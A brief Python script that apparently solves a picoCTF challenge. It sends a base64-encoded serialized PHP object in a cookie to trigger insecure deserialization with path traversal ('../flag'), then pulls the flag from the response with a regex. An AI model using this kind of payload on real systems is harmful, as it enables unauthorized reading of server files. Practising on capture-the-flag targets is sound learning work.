#import library
import requests
import re

#set payload in cookie header
headers = {'Cookie': 'login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9'}
#get request
r = requests.get('http://mercury.picoctf.net:25395/authentication.php', headers=headers)
#regex
p = re.compile('picoCTF\{.*\}')
#get flag
flag = p.findall(r.text)[0]
print(flag)